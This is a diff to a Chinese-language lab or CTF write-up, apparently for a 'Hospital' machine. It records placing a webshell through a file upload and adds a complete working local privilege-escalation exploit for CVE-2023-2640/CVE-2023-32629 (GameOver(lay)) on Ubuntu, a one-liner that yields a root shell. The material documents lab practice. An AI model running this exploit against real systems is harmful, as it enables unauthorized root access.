@@ -520,7 +520,27 @@ PORT     STATE SERVICE
 - 8080
 可以上传文件,在uploads目录下 .htaccess无法利用
 可以上传phar ...
-传了一个命令行的webshell,放在
+传了一个命令行的webshell,放在uploads目录下
+
+- 提权,搜索linux 5.19.0 privilege escalation,基本都指向了CVE-2023-2640 & CVE-2023-32629 这俩个漏洞
+exp
+
+```bash
+#!/bin/bash
+
+# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
+# by g1vi https://github.com/g1vi
+# October 2023
+
+echo "[+] You should be root now"
+echo "[+] Type 'exit' to finish and leave the house cleaned"
+
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
+```
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240406222712.png)
+
+当前靶机是window,这台是wsl,需要横向
 
 - 443
 Hospital Webmail
